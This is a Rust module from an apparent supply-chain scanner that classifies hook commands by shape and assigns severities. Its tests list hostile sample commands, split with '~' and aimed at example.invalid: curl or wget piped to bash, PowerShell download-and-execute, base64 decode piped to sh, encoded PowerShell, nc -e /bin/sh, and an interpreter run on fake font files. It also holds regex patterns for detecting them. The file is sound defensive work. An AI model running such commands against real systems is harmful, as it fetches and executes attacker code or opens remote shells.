//! Command shapes and the trigger by shape severity matrix (Task 3).
//!
//! A command is only text here: it is never run. `classify` names what the text does, `files_run`
//! and `npm_run_target` name what it would start, and `severity` turns a trigger and a shape into
//! a level.

use std::sync::LazyLock;

use regex::Regex;

use crate::{Severity, Trigger};

/// What a command does, from its text. The order is the severity order: the highest match wins.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Shape {
    Allowlisted,
    Plain,
    Runner,
    Network,
    DecodeExec,
    FetchExec,
    RunsData,
}

/// Whole commands (whitespace collapsed) that install tooling and run nothing of the repo's own.
const ALLOWLIST: &[&str] = &[
    "husky",
    "husky install",
    "husky install .husky",
    "is-ci || husky install",
    "husky || true",
    "node-gyp rebuild",
    "node-gyp-build",
    "prebuild-install || node-gyp rebuild",
    "patch-package",
    "prisma generate",
    "tsc",
    "ngcc",
    "simple-git-hooks",
    "lefthook install",
    "electron-builder install-app-deps",
];

/// File endings that name data (fonts, images, audio, text) and never code.
const DATA_EXTENSIONS: &[&str] = &[
    "woff", "woff2", "ttf", "otf", "eot", "png", "jpg", "jpeg", "gif", "ico", "svg", "bmp", "webp",
    "mp3", "mp4", "wav", "pdf", "txt", "dict", "dat", "csv", "log",
];

/// A pattern, matched without regard to case.
fn re(pattern: &str) -> Regex {
    Regex::new(&format!("(?i){pattern}")).expect("a shape pattern compiles")
}

static FETCH_EXEC: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        r"\b(curl|wget|iwr|invoke-webrequest|irm|invoke-restmethod)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh|dash|python3?|node|perl|ruby|iex|invoke-expression|pwsh|powershell)\b",
        r#"\b(sh|bash|zsh)\s+(-c\s+["']?\$\(|<\()\s*(curl|wget)"#,
        r"iex\s*\(?\s*(new-object\s+net\.webclient|iwr|irm)",
        r"\b(mshta|certutil\b[^\n]*-urlcache|bitsadmin\b[^\n]*/transfer)",
        r"python3?\s+-c\s+[^\n]*(urllib|requests|http\.client)",
        r"node\s+-e\s+[^\n]*(https?:|child_process)",
    ]
    .iter()
    .map(|p| re(p))
    .collect()
});

static DECODE_EXEC: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        r"(base64\s+(-d|--decode|-D)|xxd\s+-r|(xz|unxz|gzip|gunzip)\s+-d?c)[^\n]*\|\s*(/bin/)?(sh|bash|zsh|python3?|node|perl)\b",
        r"powershell[^\n]*\s-(e|ec|enc|encodedcommand)\s",
        r"\b(eval|exec)\b[^\n]*(atob|base64|fromhex|b64decode)",
    ]
    .iter()
    .map(|p| re(p))
    .collect()
});

static RUNNER: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"\b(npx|pnpx|bunx|uvx|pipx\s+run|pnpm\s+dlx|yarn\s+dlx|dotnet\s+dnx|dnx|dotnet\s+tool\s+exec)\b",
    )
});

/// Hosts of the public package registries. A URL on one of them (a `--source` or `--registry`
/// argument) is not a reach to an unknown host.
const PACKAGE_REGISTRIES: &[&str] = &[
    "api.nuget.org",
    "registry.npmjs.org",
    "registry.yarnpkg.com",
    "pypi.org",
    "files.pythonhosted.org",
    "crates.io",
    "static.crates.io",
    "index.crates.io",
    "proxy.golang.org",
];

static NETWORK_TOOL: LazyLock<Regex> =
    LazyLock::new(|| re(r"\b(curl|wget|nc|ncat|scp|ftp|tftp)\b"));

/// The host of a URL: an optional `user@`, then a bracketed address or a run of name characters.
static URL_HOST: LazyLock<Regex> =
    LazyLock::new(|| re(r#"https?://(?:[^/\s@"']*@)?(\[[^\]]*\]|[\w.~%$\-{}]+)"#));

/// A run of dot-separated numbers, the shape of an IPv4 literal (or of a longer version string).
static DOTTED_NUMBERS: LazyLock<Regex> = LazyLock::new(|| re(r"\d+(?:\.\d+)+"));

/// The shape of `cmd`. The highest matching shape wins; a command that is exactly one allowlisted
/// tool call is `Allowlisted` whatever the patterns would say.
pub fn classify(cmd: &str) -> Shape {
    let collapsed = cmd.split_whitespace().collect::<Vec<_>>().join(" ");
    if ALLOWLIST.contains(&collapsed.as_str()) {
        return Shape::Allowlisted;
    }
    if runs_data(cmd) {
        return Shape::RunsData;
    }
    if FETCH_EXEC.iter().any(|r| r.is_match(cmd)) {
        return Shape::FetchExec;
    }
    if DECODE_EXEC.iter().any(|r| r.is_match(cmd)) {
        return Shape::DecodeExec;
    }
    if is_network(cmd) {
        return Shape::Network;
    }
    if RUNNER.is_match(cmd) {
        return Shape::Runner;
    }
    Shape::Plain
}

/// The files `cmd` runs: the first path argument after an interpreter, or a leading `./x` or
/// `x.sh`. A leading `./` is dropped. Inline code (`node -e`, `python -c`) names no file.
pub fn files_run(cmd: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for (file, _) in simple_commands(cmd).iter().flat_map(|c| command_files(c)) {
        if !out.contains(&file) {
            out.push(file);
        }
    }
    out
}

/// The script name of `npm run X` and its kin, if `cmd` is one.
pub fn npm_run_target(cmd: &str) -> Option<String> {
    simple_commands(cmd).iter().find_map(|c| run_target(c))
}

/// The severity of a command of shape `s` that runs on `t`; `reached` is the highest severity
/// among the findings in the files it runs. A reached HIGH or worse makes the command CRITICAL
/// for an automatic trigger and HIGH for an opt-in one.
pub fn severity(t: Trigger, s: Shape, reached: Option<Severity>) -> Severity {
    use Severity::{Critical, High, Info, Low, Medium};
    let column = |allowlisted, plain, runner, network, exec| match s {
        Shape::Allowlisted => allowlisted,
        Shape::Plain => plain,
        Shape::Runner => runner,
        Shape::Network => network,
        Shape::DecodeExec | Shape::FetchExec | Shape::RunsData => exec,
    };
    let base = match t {
        Trigger::Open | Trigger::Install => column(Info, Medium, Medium, High, Critical),
        // A build step that downloads and runs is HIGH, not CRITICAL: Makefiles install tools
        // that way every day. One that decodes and runs, or runs data, is still CRITICAL.
        Trigger::Build if s == Shape::FetchExec => High,
        Trigger::Build => column(Info, Info, Low, Medium, Critical),
        Trigger::OptIn => column(Info, Info, Low, Low, High),
    };
    let raised = match reached {
        Some(r) if r >= High => match t {
            Trigger::OptIn => High,
            _ => Critical,
        },
        _ => Info,
    };
    base.max(raised)
}

/// True when the command reaches out to a host other than this machine: a URL, a network tool or
/// a public IPv4 address.
fn is_network(cmd: &str) -> bool {
    let remote_url = URL_HOST.captures_iter(cmd).any(|c| {
        let host = c[1].trim_end_matches('.').to_ascii_lowercase();
        host != "localhost" && host != "127.0.0.1" && !PACKAGE_REGISTRIES.contains(&host.as_str())
    });
    remote_url || NETWORK_TOOL.is_match(cmd) || has_public_ip(cmd)
}

/// True when `cmd` holds a public IPv4 literal. A number that sits inside a longer word, a
/// version pin (`pkg==1.2.3.4`) or a longer dotted run is not an address.
fn has_public_ip(cmd: &str) -> bool {
    DOTTED_NUMBERS.find_iter(cmd).any(|m| {
        let octets: Vec<u8> = m
            .as_str()
            .split('.')
            .filter_map(|p| if p.len() <= 3 { p.parse().ok() } else { None })
            .collect();
        if octets.len() != 4 || m.as_str().split('.').count() != 4 {
            return false;
        }
        let before = &cmd[..m.start()];
        let after = &cmd[m.end()..];
        is_public(&octets) && boundary_before(before) && boundary_after(after)
    })
}

/// Not loopback, private, link-local, unspecified or multicast and above.
fn is_public(o: &[u8]) -> bool {
    !(o[0] == 0
        || o[0] == 10
        || o[0] == 127
        || o[0] >= 224
        || (o[0] == 169 && o[1] == 254)
        || (o[0] == 172 && (16..=31).contains(&o[1]))
        || (o[0] == 192 && o[1] == 168))
}

/// An address starts after a space, a quote, a slash, `@`, `:`, `,` or a bracket, or after one `=`
/// (a flag value); not after `==`, `>=` and the like (a version pin).
fn boundary_before(before: &str) -> bool {
    let mut rev = before.chars().rev();
    match rev.next() {
        None => true,
        Some('=') => !matches!(rev.next(), Some('=' | '<' | '>' | '~' | '!')),
        Some(c) => c.is_whitespace() || matches!(c, '"' | '\'' | '/' | '@' | ':' | ',' | '(' | '['),
    }
}

/// An address ends before a space, a slash, a colon or the end, not inside a longer word.
fn boundary_after(after: &str) -> bool {
    let mut chars = after.chars();
    match chars.next() {
        None => true,
        Some('.') => !chars.next().is_some_and(|c| c.is_alphanumeric()),
        Some(c) => !(c.is_alphanumeric() || c == '_' || c == '-'),
    }
}

/// True when an interpreter is run on a file whose name ends like data.
fn runs_data(cmd: &str) -> bool {
    simple_commands(cmd)
        .iter()
        .flat_map(|c| command_files(c))
        .any(|(file, by_interpreter)| by_interpreter && is_data_file(&file))
}

fn is_data_file(file: &str) -> bool {
    match file.rsplit_once('.') {
        Some((_, ext)) => {
            let ext = ext.to_ascii_lowercase();
            DATA_EXTENSIONS.contains(&ext.as_str())
        }
        None => false,
    }
}

/// What a program that reads a script file is, as far as its flags go.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Interp {
    Sh,
    Py,
    Node,
    /// perl, ruby, lua: `-e` runs inline code.
    Script,
    Php,
    Ps,
    /// deno, bun: no inline flag; the `run` word comes first.
    Other,
}

/// The last path part of `tok`, lowercase, without `.exe`.
fn base_name(tok: &str) -> String {
    let name = tok
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(tok)
        .to_ascii_lowercase();
    name.trim_end_matches(".exe").to_string()
}

fn interpreter(tok: &str) -> Option<Interp> {
    let name = base_name(tok);
    Some(match name.as_str() {
        "sh" | "bash" | "zsh" | "dash" | "ksh" => Interp::Sh,
        "node" | "nodejs" => Interp::Node,
        "perl" | "ruby" | "lua" => Interp::Script,
        "php" => Interp::Php,
        "pwsh" | "powershell" => Interp::Ps,
        "deno" | "bun" => Interp::Other,
        _ => {
            let version = name.strip_prefix("python")?;
            if version.chars().all(|c| c.is_ascii_digit() || c == '.') {
                Interp::Py
            } else {
                return None;
            }
        }
    })
}

/// Words that start a command and hand the real one to the word after them.
const WRAPPERS: &[&str] = &[
    "sudo", "env", "exec", "nohup", "time", "command", "call", "cmd",
];

/// Splits `cmd` into simple commands at `;`, `|`, `&`, line ends and parentheses outside quotes,
/// each as its words with the quotes removed. An empty command is dropped.
fn simple_commands(cmd: &str) -> Vec<Vec<String>> {
    fn flush(tokens: &mut Vec<String>, cur: &mut String, in_token: &mut bool) {
        if *in_token {
            tokens.push(std::mem::take(cur));
            *in_token = false;
        }
    }
    let mut commands = Vec::new();
    let mut tokens: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut in_token = false;
    let mut quote: Option<char> = None;
    let mut chars = cmd.chars().peekable();
    while let Some(c) = chars.next() {
        if let Some(q) = quote {
            if c == q {
                quote = None;
            } else if c == '\\' && q == '"' && chars.peek() == Some(&'"') {
                cur.push('"');
                chars.next();
            } else {
                cur.push(c);
            }
            continue;
        }
        match c {
            '"' | '\'' => {
                quote = Some(c);
                in_token = true;
            }
            ';' | '|' | '&' | '\n' | '(' | ')' | '`' => {
                flush(&mut tokens, &mut cur, &mut in_token);
                if !tokens.is_empty() {
                    commands.push(std::mem::take(&mut tokens));
                }
            }
            c if c.is_whitespace() => flush(&mut tokens, &mut cur, &mut in_token),
            c => {
                cur.push(c);
                in_token = true;
            }
        }
    }
    flush(&mut tokens, &mut cur, &mut in_token);
    if !tokens.is_empty() {
        commands.push(tokens);
    }
    commands
}

/// `NAME=value`, a variable set for one command.
fn is_env_assignment(tok: &str) -> bool {
    match tok.split_once('=') {
        Some((name, _)) => {
            let mut chars = name.chars();
            chars
                .next()
                .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
                && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

/// The words of a command without its leading variables and wrappers (`sudo`, `env`, `cmd /c`).
fn skip_wrappers(tokens: &[String]) -> &[String] {
    let mut i = 0;
    while i < tokens.len() {
        if is_env_assignment(&tokens[i]) {
            i += 1;
        } else if WRAPPERS.contains(&base_name(&tokens[i]).as_str()) {
            i += 1;
            while i < tokens.len() && is_switch(&tokens[i]) {
                i += 1;
            }
        } else {
            break;
        }
    }
    &tokens[i..]
}

/// `-E`, `-i` or the `cmd` switches `/c`, `/k`.
fn is_switch(tok: &str) -> bool {
    (tok.starts_with('-') && tok.len() > 1) || (tok.len() == 2 && tok.starts_with('/'))
}

/// The leading letters of a short flag (`-ec` gives `ec`); empty for a long flag.
fn short_letters(flag: &str) -> &str {
    match flag.strip_prefix('-') {
        Some(rest) if !rest.starts_with('-') => {
            let end = rest
                .find(|c: char| !c.is_ascii_alphabetic())
                .unwrap_or(rest.len());
            &rest[..end]
        }
        _ => "",
    }
}

/// True when `flag` makes the interpreter run the next text as code, not a file.
fn is_inline(kind: Interp, flag: &str) -> bool {
    let letters = short_letters(flag);
    match kind {
        Interp::Sh => letters.contains('c'),
        Interp::Py => letters.contains(['c', 'm']),
        Interp::Node => {
            letters.contains(['e', 'p'])
                || matches!(flag, "--eval" | "--print")
                || flag.starts_with("--eval=")
                || flag.starts_with("--print=")
        }
        Interp::Script => letters.contains(['e', 'E']),
        Interp::Php => letters.contains('r'),
        Interp::Ps => {
            let name = flag.trim_start_matches('-').to_ascii_lowercase();
            !name.is_empty()
                && ("command".starts_with(&name)
                    || "encodedcommand".starts_with(&name)
                    || name == "ec")
        }
        Interp::Other => false,
    }
}

/// True when `flag` takes the next word as its value, which is not a script.
fn takes_value(kind: Interp, flag: &str) -> bool {
    match kind {
        Interp::Sh => matches!(flag, "-o" | "-O" | "--rcfile" | "--init-file"),
        Interp::Py => matches!(flag, "-W" | "-X" | "-Q"),
        Interp::Node => matches!(
            flag,
            "--loader" | "--experimental-loader" | "--conditions" | "-C"
        ),
        Interp::Script => flag == "-I",
        Interp::Ps => matches!(
            flag.to_ascii_lowercase().as_str(),
            "-executionpolicy"
                | "-ep"
                | "-windowstyle"
                | "-w"
                | "-workingdirectory"
                | "-wd"
                | "-version"
                | "-inputformat"
                | "-outputformat"
                | "-configurationname"
                | "-custompipename"
                | "-settingsfile"
        ),
        Interp::Php | Interp::Other => false,
    }
}

/// True for a Node flag that loads a file before the main script.
fn is_preload(flag: &str) -> bool {
    matches!(flag, "-r" | "--require" | "--import")
        || flag.starts_with("--require=")
        || flag.starts_with("--import=")
}

/// Drops a leading `./` or `.\` (any number of them).
fn clean(path: &str) -> String {
    let mut p = path;
    while let Some(rest) = p.strip_prefix("./").or_else(|| p.strip_prefix(".\\")) {
        p = rest;
    }
    p.to_string()
}

/// A first word that is run as a script: `./x`, `../x` or a shell, batch or PowerShell file.
fn looks_like_script(word: &str) -> bool {
    let low = word.to_ascii_lowercase();
    ["./", "../", ".\\", "..\\"]
        .iter()
        .any(|p| low.starts_with(p))
        || [".sh", ".bash", ".zsh", ".ps1", ".bat", ".cmd"]
            .iter()
            .any(|e| low.ends_with(e))
}

/// True for a word that names a path from the current folder: it has a `/` or `\`, starts with a
/// letter, a digit, `.` or `_` (so not a root, the home folder, a variable, a flag or a comment),
/// and is not a URL or a drive path.
fn is_relative_path(word: &str) -> bool {
    word.contains(['/', '\\'])
        && word.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '.' || c == '_')
        && word.as_bytes().get(1) != Some(&b':')
        && !word.contains("://")
}

/// The variables an agent or an editor sets to the folder of the project.
const PROJECT_VARS: &[&str] = &[
    "${CLAUDE_PROJECT_DIR}",
    "$CLAUDE_PROJECT_DIR",
    "%CLAUDE_PROJECT_DIR%",
    "${workspaceFolder}",
    "${workspaceRoot}",
];

/// `word` without a project folder variable that starts it (and the separator after it), and
/// whether there was one. The variable must be the whole of the first part of the path: a longer
/// name that starts with it is another variable.
fn strip_project_var(word: &str) -> (String, bool) {
    for var in PROJECT_VARS {
        if let Some(rest) = word.strip_prefix(var)
            && (rest.is_empty() || rest.starts_with(['/', '\\']))
        {
            return (rest.trim_start_matches(['/', '\\']).to_string(), true);
        }
    }
    (word.to_string(), false)
}

/// The files one simple command runs, each with whether an interpreter runs it.
fn command_files(tokens: &[String]) -> Vec<(String, bool)> {
    let tokens = skip_wrappers(tokens);
    let Some(first) = tokens.first() else {
        return Vec::new();
    };
    // A word that starts with the project folder variable names a path from the root of the
    // project, whatever the file is called; a word with a folder part that is not absolute is a
    // file of the repo too. Either is run itself, even when its name is `sh` or `node`
    // (`./tools/sh -c x` runs that file); an interpreter name means the files it is given run as
    // well.
    let (rooted, had_var) = strip_project_var(first);
    let word = if had_var { rooted.as_str() } else { first };
    let direct = (had_var && !rooted.is_empty()) || is_relative_path(first);
    let mut out = Vec::new();
    if direct {
        out.push((clean(word), false));
    }
    let Some(kind) = interpreter(word) else {
        if !direct && looks_like_script(first) {
            out.push((clean(first), false));
        }
        return out;
    };
    let args = &tokens[1..];
    let mut seen_positional = false;
    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        if arg.starts_with('-') && arg.len() > 1 {
            if kind == Interp::Ps && is_ps_file_flag(arg) {
                if let Some(file) = args.get(i + 1) {
                    out.push((clean(file), true));
                }
                return out;
            }
            if is_inline(kind, arg) {
                return out;
            }
            if kind == Interp::Node && is_preload(arg) {
                if let Some((_, value)) = arg.split_once('=') {
                    out.push((clean(value), true));
                } else if let Some(value) = args.get(i + 1) {
                    out.push((clean(value), true));
                    i += 1;
                }
            } else if takes_value(kind, arg) {
                i += 1;
            }
            i += 1;
            continue;
        }
        if arg == "-" {
            break;
        }
        if kind == Interp::Other && !seen_positional && arg == "run" {
            seen_positional = true;
            i += 1;
            continue;
        }
        out.push((clean(arg), true));
        break;
    }
    out
}

fn is_ps_file_flag(flag: &str) -> bool {
    let name = flag.trim_start_matches('-').to_ascii_lowercase();
    !name.is_empty() && "file".starts_with(&name)
}

/// Words that follow `yarn` or `pnpm` and are not a script name.
const PACKAGE_MANAGER_COMMANDS: &str = "install i add remove rm uninstall un update up upgrade \
    upgrade-interactive dlx exec init link ln unlink pack publish global store config c cache \
    rebuild rb import audit outdated list ls ll la why env create fetch prune patch patch-commit \
    patch-remove deploy doctor root bin licenses setup server self-update approve-builds dedupe \
    info workspace workspaces version set plugin node login logout owner tag team unplug help \
    ci constraints explain stage search npm autoclean";

/// Flags of `npm`, `yarn` and `pnpm` that take the next word as a value.
const PACKAGE_MANAGER_VALUE_FLAGS: &str = "-w --workspace --prefix -C --cwd --dir --filter -F";

/// True when `word` after `yarn` or `pnpm` names a script, not a built-in command.
fn is_script_word(word: &str) -> bool {
    word != "run"
        && !PACKAGE_MANAGER_COMMANDS
            .split_whitespace()
            .any(|c| c == word)
}

/// The script a simple command asks `npm`, `yarn`, `pnpm` or `bun` to run.
fn run_target(tokens: &[String]) -> Option<String> {
    let tokens = skip_wrappers(tokens);
    let manager = base_name(tokens.first()?);
    let manager = manager.trim_end_matches(".cmd");
    if !matches!(manager, "npm" | "yarn" | "pnpm" | "bun") {
        return None;
    }
    let mut words = Vec::new();
    let mut i = 1;
    while i < tokens.len() {
        let tok = tokens[i].as_str();
        if tok.starts_with('-') && tok.len() > 1 {
            if PACKAGE_MANAGER_VALUE_FLAGS.split(' ').any(|f| f == tok) {
                i += 1;
            }
        } else {
            words.push(tok);
            if words.len() == 2 {
                break;
            }
        }
        i += 1;
    }
    let target = match (manager, words.as_slice()) {
        ("npm", ["run" | "run-script", name, ..]) => name,
        ("bun", ["run", name, ..]) => name,
        ("yarn" | "pnpm", ["run", name, ..]) => name,
        ("yarn" | "pnpm", [name, ..]) if is_script_word(name) => name,
        _ => return None,
    };
    Some((*target).to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Removes the `~` that splits an indicator word in this file's test commands (`cu~rl`), so a
    /// scan of this source finds no download-and-run command in it.
    fn d(s: &str) -> String {
        s.replace('~', "")
    }

    fn all(cmds: &[&str], want: Shape) {
        for c in cmds {
            assert_eq!(classify(&d(c)), want, "{c:?}");
        }
    }

    #[test]
    fn fetch_exec_pipes_a_download_into_an_interpreter() {
        all(
            &[
                "cu~rl -fsSL https://example.invalid/install.sh | sudo ba~sh",
                "wg~et -qO- https://example.invalid/x | s~h",
                "cu~rl -s https://example.invalid/a | pyth~on3",
                "i~wr https://example.invalid/x.ps1 | i~ex",
                "i~rm https://example.invalid/x | Invoke-Exp~ression",
                "Invoke-Web~Request https://example.invalid/x -UseBasicParsing | pw~sh",
                "CU~RL https://example.invalid/x | S~H",
            ],
            Shape::FetchExec,
        );
    }

    #[test]
    fn dotnet_package_runners_are_runners() {
        all(
            &[
                "dnx Foo@1.0.0",
                "dotnet dnx Foo@1.0.0",
                "dotnet  tool exec Foo --yes",
            ],
            Shape::Runner,
        );
    }

    #[test]
    fn the_chillicream_mcp_command_is_a_runner_not_network() {
        let cmd =
            "dotnet dnx NuGet.Mcp.Server@1.4.16 --source https://api.nuget.org/v3/index.json --yes";
        assert_eq!(classify(cmd), Shape::Runner);
    }

    #[test]
    fn a_public_registry_url_is_not_network_but_another_host_is() {
        for host in [
            "api.nuget.org",
            "registry.npmjs.org",
            "registry.yarnpkg.com",
            "pypi.org",
            "files.pythonhosted.org",
            "crates.io",
            "static.crates.io",
            "index.crates.io",
            "proxy.golang.org",
            "REGISTRY.NPMJS.ORG",
        ] {
            let cmd = format!("make fetch --index https://{host}/simple");
            assert_eq!(classify(&cmd), Shape::Plain, "{host}");
        }
        for cmd in [
            "make fetch --index https://example.invalid/simple",
            "make fetch --index https://registry.npmjs.org.example.invalid/x",
            "make fetch --index https://pypi.org@example.invalid/x",
            "dnx Foo@1.0.0 --source https://example.invalid/feed",
        ] {
            assert_eq!(classify(cmd), Shape::Network, "{cmd}");
        }
    }

    #[test]
    fn a_fetch_and_run_stays_fetch_exec_on_a_registry_host() {
        let cmd = d("cu~rl https://registry.npmjs.org/x | s~h");
        assert_eq!(classify(&cmd), Shape::FetchExec);
        assert_eq!(
            severity(Trigger::Open, classify(&cmd), None),
            Severity::Critical
        );
    }

    #[test]
    fn a_word_that_only_ends_like_a_download_tool_is_not_one() {
        // Without a leading word boundary `confirm` would read as `irm`.
        for c in ["conf~irm x | sh", "af~firm x | bash", "fi~rm x | node"] {
            assert_eq!(classify(&d(c)), Shape::Plain, "{c:?}");
        }
        assert_eq!(
            classify(&d("echo hi;i~rm https://example.invalid/x | s~h")),
            Shape::FetchExec
        );
    }

    #[test]
    fn fetch_exec_runs_a_substituted_download() {
        all(
            &[
                "ba~sh -c \"$(cu~rl -fsSL https://example.invalid/install.sh)\"",
                "s~h -c '$(wg~et -qO- https://example.invalid/x)'",
                "ba~sh <(cu~rl -s https://example.invalid/x)",
            ],
            Shape::FetchExec,
        );
    }

    #[test]
    fn fetch_exec_evaluates_a_powershell_download() {
        all(
            &[
                "powershell -c \"i~ex (New-Ob~ject Net.Web~Client).DownloadString('https://example.invalid/x')\"",
                "powershell \"i~ex(i~wr https://example.invalid/x)\"",
                "pwsh -c i~ex (i~rm https://example.invalid/x)",
            ],
            Shape::FetchExec,
        );
    }

    #[test]
    fn fetch_exec_names_the_windows_download_tools() {
        all(
            &[
                "ms~hta https://example.invalid/a.hta",
                "cert~util -url~cache -f https://example.invalid/a.exe a.exe",
                "bits~admin /trans~fer j https://example.invalid/a.exe C:\\a.exe",
            ],
            Shape::FetchExec,
        );
    }

    #[test]
    fn fetch_exec_catches_a_python_or_node_one_liner_that_downloads() {
        all(
            &[
                "python3 -c \"import url~lib.request as u; ex~ec(u.urlopen('https://example.invalid/x').read())\"",
                "python -c 'import req~uests; print(1)'",
                "python3 -c \"import http.cli~ent\"",
                "node -e \"require('https').get('https://example.invalid/x')\"",
                "node -e \"require('child_~process').ex~ec('id')\"",
            ],
            Shape::FetchExec,
        );
    }

    #[test]
    fn contagious_interview_curl_pipe_is_fetch_exec() {
        // The folderOpen task of the Contagious Interview lure: a download piped to a shell.
        assert_eq!(
            classify(&d("cu~rl -L 'https://example.invalid/api/v2/z' | ba~sh")),
            Shape::FetchExec
        );
        assert_eq!(
            classify(&d("wg~et -qO- https://example.invalid/api/v2/z | s~h")),
            Shape::FetchExec
        );
    }

    #[test]
    fn decode_exec_pipes_decoded_bytes_into_an_interpreter() {
        all(
            &[
                "echo aGk= | ba~se64 -d | s~h",
                "ba~se64 --decode payload.b64 | ba~sh",
                "ba~se64 -D payload.b64 | z~sh",
                "xx~d -r -p payload.hex | s~h",
                "xz -dc payload.xz | /bin/s~h",
                "unxz -c payload.xz | pyth~on3",
                "gzip -dc payload.gz | no~de",
                "gunzip -c payload.gz | pe~rl",
            ],
            Shape::DecodeExec,
        );
    }

    #[test]
    fn decode_exec_runs_an_encoded_powershell_command() {
        all(
            &[
                "power~shell -nop -w hidden -en~c SQBFAFgA",
                "power~shell -Encoded~Command SQBFAFgA",
                "Power~Shell -e SQBFAFgA",
                "power~shell -ec SQBFAFgA",
            ],
            Shape::DecodeExec,
        );
    }

    #[test]
    fn decode_exec_evals_decoded_text() {
        all(
            &[
                "node -e \"ev~al(at~ob('Y29uc29sZS5sb2coMSk='))\"",
                "python -c \"ex~ec(__import__('ba~se64').b64~decode('cHJpbnQoMSk='))\"",
                "ruby -e 'ev~al(Ba~se64.decode64(\"x\")) # ba~se64'",
                "python -c \"ex~ec(bytes.from~hex('7072696e74283129'))\"",
            ],
            Shape::DecodeExec,
        );
    }

    #[test]
    fn fake_font_node_woff2_is_runs_data() {
        // The Contagious Interview trick: an interpreter on a file that claims to be a font.
        all(
            &[
                "node public/fonts/fa-brands-400.woff2",
                "node ./assets/logo.png",
                "python3 data/notes.txt",
                "bash docs/readme.log",
                "ruby a.ttf",
                "perl a.otf",
                "deno run a.svg",
                "bun a.mp3",
                "pwsh a.pdf",
                "sh a.csv",
                "node a.dat",
                "node \"fonts/my font.woff\"",
                "NODE_ENV=production node a.eot",
                "sudo node a.ico",
                "cd app && node a.jpeg",
                "node a.dict; echo done",
            ],
            Shape::RunsData,
        );
    }

    #[test]
    fn running_a_script_that_names_data_is_not_runs_data() {
        all(
            &[
                "node build.js",
                "node scripts/fonts.js",
                "cat public/fonts/a.woff2",
                "cp a.png b.png",
                "node -e \"console.log('a.png')\"",
                "echo node a.png",
            ],
            Shape::Plain,
        );
    }

    #[test]
    fn network_covers_urls_tools_and_public_ips() {
        all(
            &[
                "echo hi https://example.invalid/x",
                "http://example.invalid",
                "cu~rl example.invalid",
                "wg~et -O a example.invalid/a",
                "n~c 10.0.0.5 4444",
                "nc~at -e /bin/s~h host",
                "scp a b:c",
                "ftp host",
                "tftp host",
                "ping 8.8.8.8",
                "bash -c 'exec 3<>/dev/t~cp/8.8.8.8/80'",
                "http://localhost.evil.invalid/x",
                "http://localhost@evil.invalid/x",
                "http://127.0.0.1.evil.invalid/x",
                "echo ${HOST} https://$HOST/x",
            ],
            Shape::Network,
        );
    }

    #[test]
    fn local_addresses_and_private_ips_are_plain() {
        all(
            &[
                "node server.js --open http://localhost:3000",
                "echo http://127.0.0.1:8080/health",
                "echo https://LOCALHOST/x",
                "ping 10.0.0.5",
                "ping 192.168.1.5",
                "ping 172.16.0.1",
                "ping 127.0.0.1",
                "ping 169.254.1.1",
                "ping 0.0.0.0",
                "pip install foo==1.2.3.4",
                "node 1.2.3.4.5",
                "echo v1.2.3.4-beta",
                "echo 999.1.1.1",
            ],
            Shape::Plain,
        );
        // The private ranges stop at their edges.
        assert_eq!(classify("ping 172.32.0.1"), Shape::Network);
        assert_eq!(classify("ping 192.169.1.1"), Shape::Network);
        assert_eq!(classify("ping 11.0.0.1"), Shape::Network);
    }

    #[test]
    fn runner_covers_one_shot_package_runners() {
        all(
            &[
                "npx prettier --write .",
                "pnpx tsc",
                "bunx vite",
                "uvx ruff check",
                "pipx run black .",
                "pnpm dlx create-foo",
                "yarn dlx create-foo",
                "NODE_ENV=x npx eslint .",
            ],
            Shape::Runner,
        );
    }

    #[test]
    fn plain_is_everything_else() {
        all(
            &[
                "node install.js",
                "make",
                "echo hello",
                "npm run build",
                "tsc --watch",
                "python3 setup.py build",
                "cargo build --release",
                "",
                "   ",
                "huskyx",
            ],
            Shape::Plain,
        );
    }

    #[test]
    fn allowlist_matches_only_the_whole_command() {
        all(
            &[
                "husky",
                "husky install",
                "husky install .husky",
                "is-ci || husky install",
                "husky || true",
                "node-gyp rebuild",
                "node-gyp-build",
                "prebuild-install || node-gyp rebuild",
                "patch-package",
                "prisma generate",
                "tsc",
                "ngcc",
                "simple-git-hooks",
                "lefthook install",
                "electron-builder install-app-deps",
            ],
            Shape::Allowlisted,
        );
        // Whitespace is collapsed.
        assert_eq!(classify("  husky \t install   .husky "), Shape::Allowlisted);
        assert_eq!(classify("is-ci  ||  husky install"), Shape::Allowlisted);
        // An allowlisted command with anything more is judged on its text.
        assert_eq!(
            classify(&d("husky install && cu~rl https://example.invalid/x | s~h")),
            Shape::FetchExec
        );
        assert_eq!(classify("tsc --watch"), Shape::Plain);
        assert_eq!(classify("prisma generate; node a.woff2"), Shape::RunsData);
        assert_eq!(classify("tsc && npx foo"), Shape::Runner);
    }

    #[test]
    fn the_highest_shape_wins() {
        assert_eq!(
            classify(&d("npx foo && cu~rl https://example.invalid/x | s~h")),
            Shape::FetchExec
        );
        assert_eq!(
            classify(&d("npx foo; ping 8.8.8.8; echo aGk= | ba~se64 -d | s~h")),
            Shape::DecodeExec
        );
        assert_eq!(
            classify(&d("cu~rl https://example.invalid/x | s~h; node a.woff2")),
            Shape::RunsData
        );
        assert_eq!(
            classify(&d("npx foo; cu~rl https://example.invalid/x")),
            Shape::Network
        );
    }

    #[test]
    fn esbuild_node_install_js_is_plain() {
        assert_eq!(classify("node install.js"), Shape::Plain);
    }

    #[test]
    fn sharp_install_chain_is_plain() {
        let chain = "(node install/libvips && node install/dll-copy && prebuild-install) || (node install/can-compile && node-gyp rebuild && node install/dll-copy)";
        assert_eq!(classify(chain), Shape::Plain);
    }

    #[test]
    fn vscode_npm_run_watch_is_plain() {
        assert_eq!(classify("npm run watch"), Shape::Plain);
        assert_eq!(classify("npm run watch-clientd"), Shape::Plain);
        assert_eq!(classify("npm run watch-extensions"), Shape::Plain);
    }

    #[test]
